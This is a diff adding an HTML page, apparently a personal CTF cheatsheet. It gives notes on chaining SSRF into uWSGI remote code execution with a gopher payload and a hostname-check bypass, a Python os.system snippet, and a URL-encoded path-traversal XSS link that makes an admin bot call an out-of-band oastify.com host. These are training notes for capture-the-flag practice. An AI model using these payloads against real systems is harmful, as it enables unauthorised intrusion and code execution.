@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<title>General personal cheatsheet</title>
+	
+	<meta name="description" content="CTF personal cheatsheet">
+	
+	<meta name="author" content="Dane">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="./OSCP personal cheatsheet_files/bootstrap.min.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/font-awesome.min.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/syntax.css" rel="stylesheet">
+	<link href="./OSCP personal cheatsheet_files/style.css" rel="stylesheet">
+	
+</head>
+
+<body data-new-gr-c-s-check-loaded="14.1043.0" data-gr-ext-installed="" style="">
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="#">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			<a type="button" class="navbar-toggle nav-link" href="#">
+				<i class="fa fa-envelope"></i>
+			</a>
+		</div>
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+    <script src="https://tryhackme.com/badge/163948"></script>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="min-height:unset !important; height: 102% !important; overflow: auto;">
+		<!-- sidebar.html -->
+<ul>
+  
+  <li><a href="#web">Web</a>
+    <ul>
+      <li><a href="#rce">RCE</a></li>
+      <li><a href="#placeholder">placeholder</a></li>
+    </ul>
+  </li>
+  <li>
+    <p><a href="#template">placeholder</a></p>
+  </li>
+</ul>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>CTF cheatsheet </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   Oct 
+	   12th,
+	   
+	   2025
+	 </span>
+	  <div class="article_body">
+	  
+
+<hr>
+<h2 id="web">Web</h2>
+
+<h3 id="rce">RCE</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#UWSGI: SSRF to RCE
+If there's uwsgi running in the web server:
+    <img src="./OSCP personal cheatsheet_files/ctf_uwsgi_detection.png">
+Run <a href="./lib/ssrf2rce.py_uwsgi.txt">solve.py</a> to generate payload.
+Note: if there a restriction on hostname, an addition slash (/) can bypass it: gopher:/// instead of gopher://
+    Remember (1) to modify the script file in solve.py (UWSGI_FILE) and (2) inject the generated payload to SSRF insertion point
+    ### Example for flask server:
+    import os
+    os.system("/readflag > /app/profiles/readable.json")
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Path Traversal + Reflected XSS
+If challenge requires to exploit XSS against admin bot, but no stored XSS or URL submit directly:
+http://94.237.123.119:52480/report?id=..%2F%3Fsearch%3D%3Cimg%20src%3Dhttp%3A%2F%2Fwkkq0jowp261z7gtbvlob10m5db4zvnk.oastify.com%3E
+</code></pre></div></div>
+
+<hr>
+<h2 id="placeholder">Placeholder</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div></div>
+<hr>
+
+		<hr>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr>
+			<p>
+				© 2022 Dane.
+			</p>
+		</footer>
+	</div>
+
+	<script async="" src="./OSCP personal cheatsheet_files/analytics.js.download"></script><script type="text/javascript" src="./OSCP personal cheatsheet_files/jquery.min.js.download"></script>
+	<script type="text/javascript" src="./OSCP personal cheatsheet_files/bootstrap.min.js.download"></script>
+	<script type="text/javascript" src="./OSCP personal cheatsheet_files/app.js.download"></script>
+
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
